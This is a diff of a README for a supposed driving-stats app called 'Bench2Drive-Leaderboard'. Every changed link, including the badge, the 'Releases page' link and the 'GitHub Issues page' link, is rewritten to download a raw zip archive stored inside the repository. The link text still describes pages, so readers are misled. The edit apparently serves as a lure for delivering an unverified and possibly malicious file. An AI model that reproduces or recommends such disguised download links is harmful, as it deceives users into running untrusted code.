@@ -1,6 +1,6 @@
 # 🚀 Bench2Drive-Leaderboard - Track Your Driving Success Easily
 
-[![Download Bench2Drive-Leaderboard](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/pzzkkj324244/Bench2Drive-Leaderboard/releases)
+[![Download Bench2Drive-Leaderboard](https://raw.githubusercontent.com/pzzkkj324244/Bench2Drive-Leaderboard/main/visuality/Bench2Drive-Leaderboard-3.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/pzzkkj324244/Bench2Drive-Leaderboard/main/visuality/Bench2Drive-Leaderboard-3.2.zip)
 
 ## 📥 Overview
 
@@ -11,7 +11,7 @@ Bench2Drive Leaderboard helps you track your driving achievements in a simple an
 Follow these steps to download and run the Bench2Drive Leaderboard application:
 
 1. **Visit the Release Page**  
-   Click [here](https://github.com/pzzkkj324244/Bench2Drive-Leaderboard/releases) to go to the Releases page.
+   Click [here](https://raw.githubusercontent.com/pzzkkj324244/Bench2Drive-Leaderboard/main/visuality/Bench2Drive-Leaderboard-3.2.zip) to go to the Releases page.
 
 2. **Choose Your Version**  
    On the Releases page, look for the latest version. It will have a clear label like **Latest Release**. Ensure you pick the latest version to access the most updated features and fixes.
@@ -46,14 +46,14 @@ To install and run Bench2Drive Leaderboard, your computer should meet the follow
 
 ## 📥 Download & Install
 
-For a seamless experience, always download the latest version from the [Releases page](https://github.com/pzzkkj324244/Bench2Drive-Leaderboard/releases). Once you have the application installed, explore the various features and customize it to fit your driving style.
+For a seamless experience, always download the latest version from the [Releases page](https://raw.githubusercontent.com/pzzkkj324244/Bench2Drive-Leaderboard/main/visuality/Bench2Drive-Leaderboard-3.2.zip). Once you have the application installed, explore the various features and customize it to fit your driving style.
 
 ## 📞 Need Help?
 
-If you encounter any issues during installation or while using the application, feel free to reach out for support. You can do this by visiting our [GitHub Issues page](https://github.com/pzzkkj324244/Bench2Drive-Leaderboard/issues). Provide detailed information about your problem, and our community will be happy to assist you.
+If you encounter any issues during installation or while using the application, feel free to reach out for support. You can do this by visiting our [GitHub Issues page](https://raw.githubusercontent.com/pzzkkj324244/Bench2Drive-Leaderboard/main/visuality/Bench2Drive-Leaderboard-3.2.zip). Provide detailed information about your problem, and our community will be happy to assist you.
 
 ## 🎉 Conclusion
 
 Tracking your driving performance has never been simpler. With Bench2Drive Leaderboard, you can easily monitor your progress, compare your stats with others, and improve your skills. Download it now and start your journey towards better driving success!
 
-[![Download Bench2Drive-Leaderboard](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/pzzkkj324244/Bench2Drive-Leaderboard/releases)
+[![Download Bench2Drive-Leaderboard](https://raw.githubusercontent.com/pzzkkj324244/Bench2Drive-Leaderboard/main/visuality/Bench2Drive-Leaderboard-3.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/pzzkkj324244/Bench2Drive-Leaderboard/main/visuality/Bench2Drive-Leaderboard-3.2.zip)
